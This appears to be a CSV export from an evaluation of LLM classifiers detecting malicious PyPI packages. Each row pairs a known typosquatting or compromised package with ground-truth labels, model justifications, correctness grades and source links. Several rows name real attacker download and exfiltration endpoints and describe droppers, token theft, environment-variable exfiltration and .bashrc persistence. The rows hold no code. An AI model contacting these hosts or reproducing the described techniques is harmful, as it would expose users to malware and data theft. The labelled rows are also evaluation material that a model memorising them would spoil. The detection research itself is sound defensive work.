Package Name,version,Objective,Details,justification,justification_correctness,objective_capture_correctness,groundtruth,package_size,classification,package_name,classification_id,package_name-2,package_metadata,Location of malicious snippet_groudthruth,suspicious_files_MAMPD,created_at,updated_at,prompt_id,model,dataset_id,experiment_id,Type,Affected Version,Published,Reported,Sample,files match,Injection Component,Obfuscation,Trigger,Conditional,Targeted OS,Source,Comment,Typo Target,Campaign,,
aws-login0tool,0.0.12,['dropper'],It does a standard package install  then fetches an .exe from a nondescript domain before attempting to execute the .exe.,The package contains a setup script that defines a custom install command (`SneakyInstall`) which downloads and executes a file from an external URL (`https://tryg.ga/syswin32.exe`). This behavior is characteristic of malicious packages that aim to install unwanted software or malware on a user's machine,Correct,Correct,malicious,3964,malicious,aws-login0tool-0.0.12.tar.gz,cbd4895b-17cc-49e0-a8f7-b3278760db0a,aws-login0tool,"{""model_type"": ""gemini"", ""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 10, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.12"", ""package_homepage"": ""https://example.com"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package contains a setup script that defines a custom install command (`SneakyInstall`) which downloads and executes a file from an external URL (`https://tryg.ga/syswin32.exe`). This behavior is characteristic of malicious packages that aim to install unwanted software or malware on a user's machine.\"" suspicious_files=['setup.py']"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.12_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",setup.py,{['setup.py'},2025-07-01 19:42:17.677581+00,2025-07-01 19:42:17.677581+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,d6053649-21c3-4cac-b28a-a978b403ea8a,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.10', '0.0.11', '0.0.12', '0.0.13', '0.0.14', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['windows'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,aws-login-tool,86,,
browserdiv,3.2.0,,,"The package named 'browserdiv' is classified as malicious due to its functionality as a 'Discord selfbot module'. The primary purpose of this module is to retrieve Discord tokens from various local storage paths and send them to a specified Discord webhook. This behavior is highly suspicious and indicative of malicious intent, as it involves unauthorized access to user tokens which can be used to hijack accounts.",,,malicious,5066,malicious,browserdiv-3.2.0.tar.gz,c55b9e9e-3f52-4bc4-805e-13d82e586283,browserdiv,"{""author_name"": ""Charles Dickens"", ""author_email"": ""<charles_dickens@yahoo.com>"", ""num_of_files"": 9, ""package_name"": ""browserdiv"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Discord selfbot module."", ""package_version"": ""3.2.0"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""sitediv.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/browserdiv-3.2.0_dump.json""}",setup.py,"{setup.py,sitediv.py,__init__.py}",2025-06-28 10:48:25.371538+00,2025-06-28 10:48:25.371538+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,d04a0cf8-f39b-4e0e-a31f-1ca5d1492bb3,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['3.2.0'],2022-07-19T12:43:58,,yes,1,,,,,,https://research.checkpoint.com/2022/cloudguard-spectral-detects-several-malicious-packages-on-pypi-the-official-software-repository-for-python-developers/,,,,,
bs4tools,0.0.1,['backdoor'],,"The package contains a Flask web application that accepts user input to execute shell commands through 'subprocess.Popen'. This behavior can lead to command injection vulnerabilities, making it potentially malicious. The use of Flask allows remote execution and interaction, which can be exploited.",,Correct,malicious,1190,malicious,bs4tools-0.0.1.tar.gz,85dd73f5-5cae-495a-b19d-a857e4d75813,bs4tools,"{""author_name"": ""ternaryternary"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 8, ""package_name"": ""bs4tools"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""UNKNOWN"", ""package_version"": ""0.0.1"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""bs4tools.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/bs4tools-0.0.1_dump.json""}",bs4tools/bs4tools.py,{bs4tools.py},2025-06-28 13:55:05.657226+00,2025-06-28 13:55:05.657226+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,32efb0b4-7d70-4337-87f1-87344434b237,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.0.1'],,,yes,1,Typosquatting,,runtime,['unconditional'],['*nix'],https://blog.sonatype.com/pypi-packages-steal-telegram-cache-files-add-windows-remote-desktop-accounts,,beautifulsoup4,,,
colorizepip,1.0.0,,,"The package contains code that actively collects sensitive information such as passwords and cookies from the user's system, using well-known libraries like httpx, requests, and os to perform network operations. Additionally, it sends data to a remote server (`kekwltd.ru`) which suggests it may be part of a data exfiltration scheme. The methods present indicate functionality for stealing tokens from various applications and actively replacing clipboard contents, potentially aimed at financial theft or account hijacking.",,,malicious,72458,malicious,colorizepip-1.0.0.tar.gz,5c058049-f289-4d30-9efd-cf6c2699c1c4,colorizepip,"{""author_name"": ""SuSB0t"", ""author_email"": ""SuSB0t@gmail.com"", ""num_of_files"": 7, ""package_name"": ""colorizepip"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Awesome Terminal fonts and colors"", ""package_version"": ""1.0.0"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""Awesome Terminal fonts and colors"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/colorizepip-1.0.0_dump.json""}",__init__.py,"{__init__.py,setup.py}",2025-06-28 13:30:58.462723+00,2025-06-28 13:30:58.462723+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,ee2ada3f-20c2-49aa-8628-df5ec37540a0,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0.0'],2023-04-06T17:45:29,,yes,1,,,,,,,,,69,,
colourama,0.1.6,['financial gain'],Downloads cryptocurrency clipboard hijacker written in VBScript. Persistence by Windows registry entry to execute it whenever the user logs into the machine.,"The `run` method of the `TotallyInnocentClass` contains a decoded base64 string that executes arbitrary code, which includes making a request to an external URL (grabify.link). This is a clear indicator of malicious behavior, as it may be attempting to exfiltrate data or perform unauthorized actions. Additionally, the usage of dynamic execution via `exec` and external requests raises serious security concerns.' ",Incorrect,Incorrect,malicious,96495,malicious,colourama-0.1.6.tar.gz,1b62aa5c-5170-4764-ac33-18df2945b701,colourama,"{""model_type"": ""gemini"", ""author_name"": ""Tommy"", ""author_email"": ""BrianNiccol@gmail.com"", ""num_of_files"": 28, ""package_name"": ""colourama"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Cross-platform coloured terminal text."", ""package_version"": ""0.1.6"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The `run` method of the `TotallyInnocentClass` contains a decoded base64 string that executes arbitrary code, which includes making a request to an external URL (grabify.link). This is a clear indicator of malicious behavior, as it may be attempting to exfiltrate data or perform unauthorized actions. Additionally, the usage of dynamic execution via `exec` and external requests raises serious security concerns.' suspicious_files=['setup.py']"", ""num_of_python_files"": 16, ""package_description"": "".. image:: https://img.shields.io/pypi/v/colourama.svg"", ""available_python_files"": [""setup.py"", ""demo07.py"", ""demo08.py"", ""demo05.py"", ""demo01.py"", ""demo06.py"", ""demo04.py"", ""fixpath.py"", ""demo02.py"", ""demo03.py"", ""win32.py"", ""initialise.py"", ""ansitowin32.py"", ""winterm.py"", ""__init__.py"", ""ansi.py""], ""package_formatted_path"": "".temp/plain/colourama-0.1.6_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,{'setup.py'},2025-07-01 19:33:38.085957+00,2025-07-01 19:33:38.085957+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,098e3ff3-7f03-4221-a733-11477734194a,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.1.6'],2017-12-05T18:04:43,2018-10-21T00:00:00,yes,1,Typosquatting,['encoding'],install,['unconditional'],['windows'],https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-discovered-in-pypi-repository-b66b8a534a8 https://nakedsecurity.sophos.com/2018/10/30/snakes-in-the-grass-malicious-code-slithers-into-python pypi-repository/ https://www.golem.de/news/pypi-malware-britisches-python-paket-klaut-bitcoin-1810-137260.html,,colorama,43,,
ctx,0.2.6,['data exfiltration'],took over project with a compromised account. Added runtime code which stole envirnment variables and sent to a heroku application,"The package contains code that sends environment variable data to an external URL (https://anti-theft-web.herokuapp.com/hacked/). This behavior is suspicious and indicative of potential malicious activity, such as data exfiltration. Additionally, it uses base64 encoding to obfuscate the data being sent, further raising concerns about its intent.",Correct,correct,malicious,16239,malicious,ctx-0.2.6.tar.gz,e5e74254-bc25-4af5-baee-2c41ba62c6e8,ctx,"{""author_name"": ""Robert Ledger"", ""author_email"": ""figlief@figlief.com"", ""num_of_files"": 18, ""package_name"": ""ctx"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A minimal but opinionated dict/object combo (like Bunch)."", ""package_version"": ""0.2.6"", ""package_homepage"": ""https://github.com/figlief/ctx"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""ctx.py"", ""test_ctx.py"", ""setup.py""], ""package_formatted_path"": "".temp/plain/ctx-0.2.6_dump.json""}",ctx.py,{ctx.py},2025-06-28 11:15:15.220132+00,2025-06-28 11:15:15.220132+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,680c83c4-e88b-4e7a-866e-4a967b8cbc47,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.2.2', '0.2.6']",,2022-05-24T00:00:00,yes,1,Compromised Repository System,,runtime,['unconditional'],['agnostic'],https://blog.sonatype.com/pypi-package-ctx-compromised-are-you-at-risk,"As of May 25th a security researcher has claimed responsibility for this attack as a ""demonstration"" of how it is possible to takeover packages in package managers.",,,,
disutil,1,['research'],As shown below  the code establishes a socket connection to a local IP address,"The package summary explicitly states ""don't download this,"" which is a strong indicator of malicious intent. Additionally, the lack of comprehensible libraries beyond setuptools, combined with minimal documentation and suspicious metadata, further suggests potential dangers associated with this package.",Incorrect,Incorrect,malicious,1598,malicious,Distutil-1.0.tar.gz,9e9e48b4-39a7-4291-a2e0-8c05c1c8fefa,distutil,"{""author_name"": ""Leo Elliot"", ""author_email"": ""alexshahi095621@gmail.com"", ""num_of_files"": 6, ""package_name"": ""Distutil"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Python Distribution Utilities: don't download this"", ""package_version"": ""1.0"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/Distutil-1.0_dump.json""}",/setup.py,{setup.py},2025-06-27 22:03:18.104275+00,2025-06-27 22:03:18.104275+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,73701a62-e733-464e-b4e4-74ef7b1dfa3f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0'],,2022-04-22T00:00:00,yes,1,Typosquatting,['base64'],install,['unconditional'],['agnostic'],https://blog.sonatype.com/this-week-in-malware-malicious-distutil-and-spring4shell-active-exploits,Research,distutils,33,,
djanga,0.3,['dropper'],Download file and persist in .bashrc,"The package contains code that downloads a file from a remote server (IP: 145.249.104.71) and executes it by adding it to the user's .bashrc file, which could allow for persistence and remote control. This behavior is characteristic of malware or potentially unwanted programs. The presence of network operations, file manipulations, and the execution of downloaded code in a system context indicates malicious intent.",Correct,Correct,malicious,2775,malicious,djanga-0.3.tar.gz,184cc76d-e0b1-46e6-9de1-2d480e4fd8e4,djanga,"{""author_name"": ""Rosa"", ""author_email"": ""rosaright@example.com"", ""num_of_files"": 9, ""package_name"": ""djanga"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Django framework"", ""package_version"": ""0.3"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""pr.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/djanga-0.3_dump.json""}",/setup.py,"{setup.py,pr.py}",2025-06-28 12:45:41.905654+00,2025-06-28 12:45:41.905654+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,356f386e-669d-4216-91bd-75edf19aab27,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1', '0.2', '0.3', '0.4']",2017-11-23T19:27:06,2018-10-13T00:00:00,yes,1,Typosquatting,,install,['operating system'],['*nix'],https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67,,django,8,,
djanga,0.2,['dropper'],Download file and persist in .bashrc,The `setup.py` and `pr.py` files contain code that downloads and executes a file from a remote server (IP: 145.249.104.71) and modifies the user's `.bashrc` file to automatically execute this file whenever a shell is opened. This behavior is indicative of malicious activity as it can lead to unauthorized code execution and potential compromise of user systems.,Correct,Correct,malicious,2775,malicious,djanga-0.2.tar.gz,48d3d5eb-6d6f-4c85-ac56-8724e6c9baed,djanga,"{""author_name"": ""Rosa"", ""author_email"": ""rosaright@example.com"", ""num_of_files"": 9, ""package_name"": ""djanga"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Django framework"", ""package_version"": ""0.2"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""pr.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/djanga-0.2_dump.json""}",/setup.py,"{setup.py,pr.py}",2025-06-28 13:38:42.534265+00,2025-06-28 13:38:42.534265+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,a94231ba-0c16-4a8c-9527-7ccb159e7c53,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1', '0.2', '0.3', '0.4']",2017-11-23T19:27:06,2018-10-13T00:00:00,yes,1,Typosquatting,,install,['operating system'],['*nix'],https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67,,django,8,,
djanga,0.4,['dropper'],Download file and persist in .bashrc,The package 'djanga' contains a setup script that attempts to download and execute a file from a remote server with an IP address (145.249.104.71). It modifies the user's .bashrc file to execute this downloaded file on startup. Such behavior is characteristic of malicious software aiming to install backdoors or execute unauthorized scripts.,Correct,Correct,malicious,2778,malicious,djanga-0.4.tar.gz,43ce7970-cea2-48c5-9c3d-92c2c8147602,djanga,"{""model_type"": ""gemini"", ""author_name"": ""Rosa"", ""author_email"": ""rosaright@example.com"", ""num_of_files"": 9, ""package_name"": ""djanga"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Django framework"", ""package_version"": ""0.4"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package 'djanga' contains a setup script that attempts to download and execute a file from a remote server with an IP address (145.249.104.71). It modifies the user's .bashrc file to execute this downloaded file on startup. Such behavior is characteristic of malicious software aiming to install backdoors or execute unauthorized scripts.\"" suspicious_files=['setup.py', 'pr.py']"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""pr.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/djanga-0.4_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,"{['setup.py', 'pr.py'}",2025-07-01 18:52:07.781909+00,2025-07-01 18:52:07.781909+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,e5cd2c06-0cb8-4c96-940a-4eac7684cc5c,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1', '0.2', '0.3', '0.4']",2017-11-23T19:27:06,2018-10-13T00:00:00,yes,1,Typosquatting,,install,['operating system'],['*nix'],https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67,,django,8,,
dpp_client,1.0.8,['data exfiltration'],It installs a malware trojan in the user's system that causes data leakage.,"The package contains code that allows the reading of sensitive information from the environment and files on the server, which is sent to a remote server (http://pt.traktrain.com/req.php) without user consent. This behavior typically indicates malicious intent.",Correct,correct,malicious,7867,malicious,dpp_client-1.0.8.tar.gz,5057413a-8217-4cad-ba92-5f8504446731,dpp-client,"{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""dpp-client"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""1.0.8"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The package contains code that allows the reading of sensitive information from the environment and files on the server, which is sent to a remote server (http://pt.traktrain.com/req.php) without user consent. This behavior typically indicates malicious intent.' suspicious_files=['setup.py']"", ""num_of_python_files"": 5, ""package_description"": ""test"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""http.py"", ""base.py"", ""test_http.py""], ""package_formatted_path"": "".temp/plain/dpp_client-1.0.8_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,{['setup.py']},2025-07-01 19:12:55.261327+00,2025-07-01 19:12:55.261327+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,74b3ee12-8b6c-4ef0-bbc7-85ea95b9b89d,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['1.0.2', '1.0.3', '1.0.4', '1.0.5', '1.0.6', '1.0.7', '1.0.8', '1.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['*nix'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,dpp-client,72,,
dpp_client,1.0.4,['data exfiltration'],It installs a malware trojan in the user's system that causes data leakage.,"The package contains code that collects sensitive information about the environment (such as the current directory, username, hostname, and contents of /etc/passwd) and sends it to an external server (http://pt.traktrain.com/req.php). This behavior is typical of malicious software trying to exfiltrate data. Additionally, the use of 'os.popen' to execute shell commands is often associated with potentially harmful actions.",Correct,correct,malicious,8001,malicious,dpp_client-1.0.4.tar.gz,1119e198-ccbd-4cc4-a52a-8b3f05360a93,dpp-client,"{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""dpp-client"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""1.0.4"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package contains code that collects sensitive information about the environment (such as the current directory, username, hostname, and contents of /etc/passwd) and sends it to an external server (http://pt.traktrain.com/req.php). This behavior is typical of malicious software trying to exfiltrate data. Additionally, the use of 'os.popen' to execute shell commands is often associated with potentially harmful actions.\"" suspicious_files=['setup.py']"", ""num_of_python_files"": 5, ""package_description"": ""test"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""http.py"", ""base.py"", ""test_http.py""], ""package_formatted_path"": "".temp/plain/dpp_client-1.0.4_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/setup.py,{['setup.py']},2025-07-01 19:27:43.708889+00,2025-07-01 19:27:43.708889+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,973a743f-81ba-4e60-8472-2dcc27fe75f3,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['1.0.2', '1.0.3', '1.0.4', '1.0.5', '1.0.6', '1.0.7', '1.0.8', '1.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['*nix'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,dpp-client,72,,
dpp_client1234,1.0.5,['data exfiltration'],It installs a malware trojan in the user's system that causes data leakage.,"The package attempts to execute a command to read the environment and send sensitive information (current working directory and files) to an external URL (http://pt.traktrain.com/req.php?test). This behavior indicates that it could be collecting data without user consent, which is suspicious and characteristic of malicious intent.",Correct,Correct,malicious,7791,malicious,dpp_client1234-1.0.5.tar.gz,08cca8bc-fba5-4e88-bb37-5a6cdbf955ac,dpp-client1234,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""dpp-client1234"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""1.0.5"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 5, ""package_description"": ""test"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""http.py"", ""base.py"", ""test_http.py""], ""package_formatted_path"": "".temp/plain/dpp_client1234-1.0.5_dump.json""}",/setup.py,{setup.py},2025-06-28 13:11:03.668595+00,2025-06-28 13:11:03.668595+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,69ad62f2-d525-4298-9bef-bcbc56369dd7,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0.5'],,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['*nix'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,dpp-client1234,72,,
easyfuncsys,0.0.4,['dropper'],These versions  upon installation  simply downloaded and ran aÂ suspicious EXEÂ on the victimâ€™s machine.,"The `__init__.py` file contains a function that downloads an executable file (`download.exe`) from a remote URL and then executes it. This behavior is characteristic of malware, which often downloads and executes additional malicious payloads.",Correct,Correct,malicious,2199,malicious,easyfuncsys-0.0.4.tar.gz,556eea02-7580-4420-8b51-963d2af43fb0,easyfuncsys,"{""author_name"": ""nfsdfssdfone"", ""author_email"": ""nonfsdfddse@gmail.com"", ""num_of_files"": 8, ""package_name"": ""easyfuncsys"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Sniping names"", ""package_version"": ""0.0.4"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/easyfuncsys-0.0.4_dump.json""}",/easyfuncsys/__init__.py,{download.exe},2025-06-28 11:00:55.521964+00,2025-06-28 11:00:55.521964+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,5ebbf763-a425-4c37-a91e-408c9606856f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.3', '0.0.4']",,2022-02-02T00:00:00,yes,0,Typosquatting,,install,['unconditional'],['agnostic'],https://blog.sonatype.com/malicious-roblox-cookie-and-discord-token-stealers-hit-pypi-repository,,,51,,
easyfuncsys,0.0.2,['dropper'],These versions  upon installation  simply downloaded and ran aÂ suspicious EXEÂ on the victimâ€™s machine.,"The package contains a function that downloads an executable file from a URL and executes it, which is a common behavior exhibited by malware. The presence of hardcoded URLs and the automatic execution of downloaded files are significant red flags indicating malicious intent.",Correct,Correct,malicious,2224,malicious,easyfuncsys-0.0.2.tar.gz,d05568b9-5ab8-41c7-9866-b11040438361,easyfuncsys,"{""author_name"": ""nfsdfssdfone"", ""author_email"": ""nonfsdfddse@gmail.com"", ""num_of_files"": 7, ""package_name"": ""easyfuncsys"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Sniping names"", ""package_version"": ""0.0.2"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/easyfuncsys-0.0.2_dump.json""}",/easyfuncsys/__init__.py,{__init__.py},2025-06-28 13:10:22.047646+00,2025-06-28 13:10:22.047646+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,1bc8134e-043c-4f05-8687-1b007e9c75a8,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.3', '0.0.4']",,2022-02-02T00:00:00,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://blog.sonatype.com/malicious-roblox-cookie-and-discord-token-stealers-hit-pypi-repository,,,51,,
